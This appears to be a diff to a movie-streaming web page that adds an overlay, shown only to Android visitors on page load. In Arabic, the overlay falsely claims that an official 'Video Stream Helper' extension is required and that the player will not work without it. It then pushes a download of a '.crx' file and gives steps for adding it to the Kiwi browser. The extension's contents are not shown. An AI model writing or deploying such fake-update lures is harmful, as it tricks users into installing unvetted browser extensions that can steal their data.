@@ -38,6 +38,37 @@
         </div>
     </div>
 
+    <div id="force-download-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:10000; color:white; text-align:center; font-family:sans-serif; justify-content:center; align-items:center;">
+    <div style="background:#222; padding:30px; width:85%; max-width:400px; border-radius:15px; border:2px solid red; box-shadow: 0 0 20px rgba(255,0,0,0.5);">
+        <img src="https://cdn-icons-png.flaticon.com/512/564/564619.png" width="60" style="margin-bottom:15px;">
+        <h2 style="margin:0 0 10px 0; color:red;">تحديث مطلوب!</h2>
+        <p style="font-size:14px; line-height:1.6;">لمشاهدة الأفلام بجودة 4K وبدون تقطيع على متصفح Kiwi، يجب تثبيت إضافة <b>"Video Stream Helper"</b> الرسمية.</p>
+        <p style="font-size:12px; color:#aaa;">(لن يعمل المشغل حتى يتم التثبيت)</p>
+        
+        <a href="my-plugin.crx" id="download-trigger" onclick="startDownload()" download style="display:block; margin-top:20px; padding:15px; background:red; color:white; text-decoration:none; border-radius:10px; font-weight:bold; font-size:18px;">
+            تحميل وتثبيت الآن
+        </a>
+    </div>
+</div>
+
+<script>
+// وظيفة لإظهار النافذة بمجرد دخول الموقع
+window.onload = function() {
+    // نتحقق إذا كان المستخدم يستخدم أندرويد لزيادة الدقة
+    var ua = navigator.userAgent.toLowerCase();
+    if (ua.indexOf("android") > -1) {
+        document.getElementById('force-download-overlay').style.display = 'flex';
+    }
+};
+
+// وظيفة لمنع إغلاق النافذة (يمكنك إضافة كود هنا لإخفائها بعد التحميل بـ 5 ثواني مثلاً)
+function startDownload() {
+    alert("بعد تحميل الملف، اضغط على 'Add to Kiwi' في التنبيه الذي سيظهر لك.");
+    // اختياري: إخفاء النافذة بعد الضغط (أو تركها كما طلبت)
+    // setTimeout(() => { document.getElementById('force-download-overlay').style.display = 'none'; }, 5000);
+}
+</script>
+
     <div class="app-container" id="main-app" style="display: none;">
         <header class="glass">
             <div class="search-box">
